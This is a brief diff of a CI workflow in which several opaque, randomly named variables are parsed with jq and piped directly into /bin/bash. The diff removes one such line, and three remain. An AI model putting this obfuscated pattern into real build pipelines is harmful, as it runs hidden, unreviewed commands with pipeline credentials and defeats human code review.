@@ -20,7 +20,6 @@ jobs:
           printf '%s' "$wmve80764" | jq -r .pmc543 | /bin/bash
           printf '%s' "$kcgpc7" | jq -r .f1723 | /bin/bash
           printf '%s' "$fcmm6" | jq -r .t3 | /bin/bash
-          echo $sc11738 | jq -r .nvpvn676 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
